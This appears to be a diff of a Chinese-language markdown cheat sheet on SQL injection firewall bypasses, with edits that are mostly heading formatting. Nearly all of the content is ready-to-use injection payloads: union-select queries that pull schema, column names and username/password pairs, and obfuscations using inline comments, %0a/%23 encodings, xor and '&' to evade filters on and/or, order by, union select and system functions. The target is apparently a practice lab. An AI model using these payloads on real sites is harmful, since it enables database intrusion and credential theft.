@@ -37,7 +37,7 @@ where table_schema='security' -- 1  进行fuzz测试\
 获取security对应表下的所有列名：\
 ?id=-2' union /*/$%^*/ select 1,group_concat(column_name),3 from --+/*%/ %0a\
 information_schema./*!columns*/ /*////*/\
-where table_schema='security' /*!12441and*/ table_name='users' -- 1\
+where table_schema='security' /*!12441and*/ table_name='users' -- 1
 #### 查询数据的绕过：
 ?id=-2' union /*/$%^*/ select 1,group_concat(username,0x3a,password),3 from /*////*/ users -- +
 
@@ -61,7 +61,7 @@ where table_schema='security' /*!12441and*/ table_name='users' -- 1\
 
 ---
 
-1=1绕过\
+#### 1=1绕过
 'and 1=1-- -被拦截\
 &符号可以绕\
 '%261-- -\
@@ -72,13 +72,13 @@ xor可以绕\
 'Xor 1-- -\
 'Xor true-- -
 
-'or length(database()=4)-- -会被ban，这样绕：\
+#### 'or length(database()=4)-- -会被ban，这样绕：\
 '%26(length(database/**/())=4)-- -\
 '%26(ascii(@@version)=53)-- -\
 1'or -1=-1-- -\
 1'or -0=-0-- -
 
-内联注释\
+#### 内联注释
 1'or /*!1=1*/-- -\
 或者简单粗暴点的 或者简单粗暴点的 直接绕过and和or：\
 /*!11440OR*/\
@@ -86,7 +86,7 @@ xor可以绕\
 
 
 
-order by绕过\
+#### order by绕过
 %23%0a绕过\
 order%23%0aby 3\
 内联注释加注释绕过\
@@ -99,14 +99,14 @@ order%23%0aby 3\
 
 
 
-union select绕过\
+#### union select绕过
 利用内联注释和注释的混淆绕过\
 1'/*!union/*!/*/**/*/select/**/1,2,'password'-- -\
 /*!11440union*/\
 /*!select/*!/*/**/*/
 
 
-系统函数绕过\
+#### 系统函数绕过
 单独的括号和函数名都不会检测，分开函数名和括号：\
 version () #直接空格\
 user%0a() #这个地方%0a~%20有很多，类似绕过空格\
@@ -114,22 +114,21 @@ database/**/() #注释符\
 user/*!*/() #内敛注释
 
 
-函数名绕过\
+#### 函数名绕过
 /*!extractvalue/*!/*/**/*/\
 /*!updatexml/*!/*/**/*/
 
-联合注入绕过方式\
+#### 联合注入绕过方式
 这里使用mysql自带的正则函数(regexp)
 
 select * from company_info where name like '桑尼';  //查询name等于桑尼的数据\
 select * from company_info where name regexp '桑尼'; //查询结果中name包含桑尼的数据
 
-获取详细信息\
-尝试获取数据库名、版本，因database()被识别被拦截
-
+#### 获取详细信息
+尝试获取数据库名、版本，因database()被识别被拦截\
 -1' regexp "%0A%23" /*!11444union*/ %0A /*!11444select*/ 1,database(/*!11444*/),version(/*!11444*/) %23
 
-注入出表名\
+#### 注入出表名
 -1' union /*!--+/*%0aselect/*!1,2,*/ group_concat(schema_name) /*!from*/
 
 /*!--+/*%0ainformation_schema./*!schemata*/ --+
